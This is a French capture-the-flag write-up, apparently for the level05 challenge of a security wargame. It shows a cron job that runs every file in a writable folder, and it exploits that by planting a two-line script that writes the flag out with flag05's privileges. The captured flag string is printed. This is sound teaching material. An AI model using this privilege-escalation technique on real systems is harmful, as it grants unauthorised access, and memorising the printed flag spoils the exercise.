# level05

## Contexte

On ne trouve rien d'intéressant directement dans le home de `level05`.

## Recherche

On cherche des fichiers ou des configurations liés à `flag05`.

On remarque la présence d'une tâche planifiée dans les fichiers de configuration du système :

```bash
cat /etc/cron*
```

On trouve un script exécuté automatiquement par le système :

```text
/usr/sbin/openarenaserver
```

On regarde son contenu :

```bash
cat /usr/sbin/openarenaserver
```

Le script exécute tous les fichiers présents dans un dossier accessible :

```text
/opt/openarenaserver/
```

## Vulnérabilité

Le problème vient du fait que le script exécuté par `cron` lance automatiquement tous les fichiers présents dans ce dossier.

Comme on peut écrire dans ce dossier, il est possible de placer notre propre script qui sera exécuté avec les droits de `flag05`.

## Exploitation

On crée un script qui récupère le flag :

```bash
echo "getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
chmod +x /opt/openarenaserver/exploit.sh
```

On attend l'exécution automatique du cron :

```bash
cat /tmp/flag
```

On obtient :

```text
viuaaale9huek52boumoomioc
```

## Ressources

- `cron`
- Scripts exécutés automatiquement
- Permissions fichiers